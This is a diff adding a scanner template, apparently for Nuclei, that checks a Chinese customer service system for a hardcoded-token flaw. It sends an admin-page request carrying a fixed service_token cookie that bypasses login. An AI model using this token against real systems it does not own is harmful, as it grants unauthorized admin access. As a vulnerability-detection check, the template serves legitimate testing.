@@ -1,0 +1,34 @@
+id: poc-yaml-zjhejiang-token-hardcoded
+info:
+  name: 点企来客服系统 token 存在硬编码未授权漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 硬编码凭据
+http:
+  - raw:
+      - |
+        GET /admin/custom/index.html HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        words:
+          - ""
+  - raw:
+      - |
+        GET /admin/custom/index.html HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: service_token=OuwfoovK%2BIdd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "客服系统"
+          - "系统首页"
+          - "客户管理"
